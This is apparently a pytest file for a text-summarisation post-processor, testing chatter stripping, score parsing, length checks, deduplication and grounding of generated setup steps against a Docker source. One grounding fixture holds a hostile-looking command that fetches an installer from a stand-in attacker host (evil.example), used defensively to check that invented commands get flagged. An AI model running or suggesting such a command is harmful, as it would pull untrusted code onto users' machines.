"""Preamble stripping, score parsing, length checks, and grounding."""

from __future__ import annotations

from tldr_everything.postprocess import (
    dedupe_lines,
    ground_practical_steps,
    length_in_range,
    parse_score,
    strip_chatter,
    word_count,
)

SOURCE = """
Install Docker 24.0.7 on the VPS.

```bash
sudo apt-get update
sudo apt-get install -y docker.io
docker compose up -d
```

The app listens on port 8080.
"""


def test_strip_chatter_removes_preamble_and_trailer() -> None:
    raw = "Sure! Here is the summary:\n\nCats sleep a lot.\n\nHope this helps!"
    assert strip_chatter(raw) == "Cats sleep a lot."


def test_parse_score_is_defensive() -> None:
    assert parse_score("SCORE: 4") == 4
    assert parse_score("score: 0") == 0
    assert parse_score("I rate this 3/5 today") == 3
    assert parse_score("bananas are great") == 0
    assert parse_score("SCORE: 9") == 0
    assert parse_score("") == 0


def test_length_range() -> None:
    text = " ".join(["word"] * 80)
    assert word_count(text) == 80
    assert length_in_range(text, 40, 130)
    assert not length_in_range(text, 90, 100)


def test_grounding_drops_invented_code_and_marks_commands() -> None:
    steps = (
        "1. Update packages.\n\n"
        "```bash\n"
        "echo pwned\n"
        "```\n\n"
        "2. Run `sudo apt-get update`.\n"
        "3. Run `curl https://evil.example/install`.\n"
        "Docker 99.1 needs port 99999."
    )
    grounded, flags = ground_practical_steps(steps, SOURCE)
    assert "echo pwned" not in grounded
    assert "sudo apt-get update" in grounded
    assert "[unverified]" in grounded
    assert "curl https://evil.example/install" in grounded
    codes = {flag.code for flag in flags}
    assert "grounding" in codes
    assert "numbers" in codes
    number_messages = " ".join(flag.message for flag in flags if flag.code == "numbers")
    assert "99.1" in number_messages
    assert "99999" in number_messages
    assert "8080" not in number_messages
    assert "24.0.7" not in number_messages


def test_real_fenced_command_is_kept() -> None:
    steps = "```bash\nsudo apt-get update\nsudo apt-get install -y docker.io\n```"
    grounded, flags = ground_practical_steps(steps, SOURCE)
    assert "sudo apt-get update" in grounded
    assert "```" in grounded
    assert not any(flag.code == "grounding" for flag in flags)


def test_dedupe_lines_keeps_order() -> None:
    text = "- Docker\n- docker\n\n- A VPS\n- Docker"
    assert dedupe_lines(text).splitlines() == ["- Docker", "", "- A VPS"]
